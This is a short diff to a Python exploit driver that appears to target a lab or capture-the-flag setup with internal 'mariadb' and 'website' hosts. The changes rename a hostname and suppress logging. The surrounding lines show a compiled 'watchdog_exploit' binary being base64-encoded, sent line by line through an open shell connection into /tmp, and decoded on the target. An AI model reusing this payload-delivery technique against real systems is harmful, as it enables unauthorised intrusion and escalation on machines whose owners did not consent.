@@ -29,7 +29,7 @@ try:
     LHOST = sys.argv[1]
     RHOST = sys.argv[2]
     MARIADB_RHOST_INTERNAL = "mariadb"
-    WEBSERVER_RHOST_INTERNAL = "webserver"
+    WEBSERVER_RHOST_INTERNAL = "website"
 
 except:
     print("Usage: python master.py [LHOST] [RHOST]")
@@ -55,7 +55,7 @@ def watchdog_exploit(conn):
     system("musl-gcc -Os -static -s -o wexp watchdog_exploit.c")
     system("base64 wexp > wexp.b64")
     watchdog = open("wexp.b64", "r").read().split("\n")
-    context.log_level = "critical"
+    context.log_level = "none"
     for line in watchdog:
         conn.sendline(f"echo {line} >> /tmp/wexp.b64")
     conn.sendline("base64 -d /tmp/wexp.b64 > /tmp/wexp")
